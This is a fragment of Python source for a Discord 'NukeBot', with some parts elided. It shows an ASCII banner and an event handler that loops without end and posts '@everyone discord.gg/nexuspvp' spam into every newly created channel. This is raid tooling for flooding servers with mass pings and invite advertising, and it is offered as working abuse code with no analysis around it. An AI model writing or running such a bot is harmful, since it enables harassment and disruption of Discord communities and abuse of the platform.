...
baner = f'''
{g} _   _       _       {b} ____        _   
{g}| \ | |_   _| | _____{b}| __ )  ___ | |_ 
{g}|  \| | | | | |/ / _ {b}\  _ \ / _ \| __|
{g}| |\  | |_| |   <  __{b}/ |_) | (_) | |_ 
{g}|_| \_|\__,_|_|\_\___{b}|____/ \___/ \__|
'''
...
async def on_guild_channel_create(channel):
  while True:
    ...
    for i in range(amount):
       await channel.send("@everyone discord.gg/nexuspvp")
       await channel.send("@everyone discord.gg/nexuspvp !")
       await channel.send("@everyone discord.gg/nexuspvp !")
       await channel.send("@everyone discord.gg/nexuspvp !")
       await channel.send("@everyone discord.gg/nexuspvp !3")
       await channel.send("@everyone discord.gg/nexuspvp !2")
       await channel.send("@everyone discord.gg/nexuspvp !1")
